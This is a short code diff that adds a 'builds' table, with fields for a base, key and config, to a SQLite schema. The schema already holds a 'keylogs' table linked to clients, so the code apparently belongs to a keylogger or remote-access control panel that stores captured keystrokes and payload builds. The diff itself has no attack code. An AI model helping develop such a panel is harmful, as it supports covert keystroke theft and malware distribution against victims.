@@ -84,6 +84,20 @@ db.exec(`
     FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
   );
   CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
+
+  CREATE TABLE IF NOT EXISTS builds (
+    id          INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id     INTEGER NOT NULL,
+    name        TEXT NOT NULL,
+    stored_name TEXT UNIQUE NOT NULL,
+    size        INTEGER NOT NULL,
+    base        TEXT NOT NULL,
+    key         TEXT NOT NULL,
+    config      TEXT NOT NULL,
+    created_at  INTEGER NOT NULL,
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+  );
+  CREATE INDEX IF NOT EXISTS idx_builds_user ON builds(user_id, created_at);
 `);
 
 try {
